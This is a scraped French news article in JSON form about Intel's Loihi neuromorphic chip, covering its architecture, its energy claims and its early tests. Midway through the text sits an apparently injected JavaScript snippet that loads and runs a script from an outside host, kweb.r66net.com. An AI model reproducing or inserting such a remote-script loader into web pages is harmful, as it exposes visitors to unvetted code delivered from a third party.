{"title": "Intel dévoile Loihi, son processeur neuromorphique", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "28/09/2017", "content": "Intel vient de dévoiler un prototype de processeur neuromorphique dont le fonctionnement s'inspire de celui du cerveau humain pour apprendre à partir de données acquises en temps réel plutôt que de s'appuyer sur une connexion à des serveurs en ligne. Cette puce « apprenante » sera dédiée à des travaux de recherche en intelligence artificielle. Ce qu'il faut retenir Intel explore un nouveau type d’architecture de processeur pour servir au développement de l’intelligence artificielle (IA). Le processeur Loihi s’inspire du fonctionnement du cerveau humain avec un réseau de 130.000 neurones qui communiquent entre eux. Ce type de processeur pourrait faire émerger des IA capables de s’adapter à leur environnement, mais le chemin est encore long. Ces dernières années, l' intelligence artificielle  (IA) a beaucoup progressé grâce à l'apprentissage automatique ( machine learning ) et ses différentes méthodes, en particulier l'apprentissage profond ( deep learning ). Mais il s'agit de systèmes spécialisés, entraînés avec un certain type de données qui, par définition, n'ont pas la capacité de produire un « raisonnement » généraliste à même de s'adapter à des conditions variables. Or, les immenses attentes que l'on place actuellement dans l'IA reposent justement sur des systèmes capables d'autonomie et d'un apprentissage à la volée à partir des données collectées en temps réel dans leur environnement. Alors, comment parvenir à un tel résultat, avec des IA capables de s'auto-organiser et de prendre des décisions en élaborant des modèles et des associations ? La réponse pourrait venir des  processeurs neuromorphiques , comme celui développé par  Intel . Le fondeur vient en effet de dévoiler une puce baptisée  Loihi  (du nom d'un  volcan sous-marin  actif au large d'Hawaï) dont l'architecture s'inspire du fonctionnement du  cerveau  humain, avec des interactions entre des milliers de  neurones .  « À mesure que les tâches des IA deviennent plus diverses et complexes, elles éprouveront les limites des architectures de calcul dominantes actuelles et entraîneront de nouvelles approches innovantes »,  estime Intel. Ces dernières années, le recours aux processeurs graphiques ( GPU ) a fait accomplir un pas de géant à l'IA, de même que le  cloud computing  avec des batteries de  serveurs  capables de traiter les grands  volumes  de données nécessaires au  machine learning . La tendance actuelle est aux processeurs spécialisés pour l' intelligence artificielle , comme en développent  Nvidia ,  Google  ( Tensor Processing Unit ), AMD, ARM, Samsung ou encore Qualcomm. Le processeur neuromorphique Loihi d’Intel © Intel                               Le processeur Loihi comprend 130.000 neurones Peu d'acteurs parient pour le moment sur les processeurs neuromorphiques, qui n'ont pas encore fait la preuve de leur supériorité face aux solutions actuelles.  IBM  a franchi le pas. Ce type de puce représente tout de même une piste prometteuse alors que l'on nous annonce la fin de la  loi de Moore  pour 2030 (voir le  livre blanc de l’IEEE ). Le fait qu'Intel, par ailleurs grand évangéliste de la loi de Moore, explore cette voie n'est évidemment pas anodin.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les 130.000 neurones et les 130 millions de  synapses  en  silicium  du  processeur  Loihi forment un réseau de cœurs neuromorphiques  asynchrones  qui savent moduler leurs interconnexions pour s'adapter à de nouvelles tâches. À l'instar de notre cerveau, chaque neurone est capable de communiquer avec des milliers d'autres. Et chaque cœur neuromorphique comprend un moteur d'apprentissage qui peut être programmé à la volée pour adapter le  réseau neuronal  en fonction des besoins. En résumé, une IA propulsée par un processeur Loihi peut apprendre à développer une forme d'expérience qui l'aide à résoudre des problèmes. Alors qu'un processeur classique partage le traitement des données entre son cœur de calcul et une mémoire séparée, les neurones adaptatifs de Loihi fusionnent le calcul et la mémoire, ce qui rend les opérations plus rapides et moins énergivores.  Intel  affirme que son processeur peut interpréter des vidéos en utilisant moins d'un millième de l' énergie  d'une puce classique. Loihi est gravé en 14 nanomètres Les premiers essais réalisés avec Loihi sont encore assez limités. La puce a été testée en lui montrant des vidéos de personnes accomplissant des  mouvements  avec leurs biceps. Elle devait ensuite retrouver les mêmes mouvements dans des vidéos inédites. Selon Intel, les capacités de Loihi, gravé en 14  nanomètres , démontrent un potentiel énorme pour améliorer des  applications  dans les domaines des transports, de la  robotique  et des industries, où l'exploitation en temps réel et autonome de données non structurées est primordiale.  Mais on en est tout de même encore très loin. Pour progresser plus rapidement, Intel a prévu de fournir des processeurs Loihi à certaines universités et centres de recherche à partir de l'année prochaine, pour qu'ils puissent travailler sur des projets d'intelligence artificielle. ", "theme": "tech"}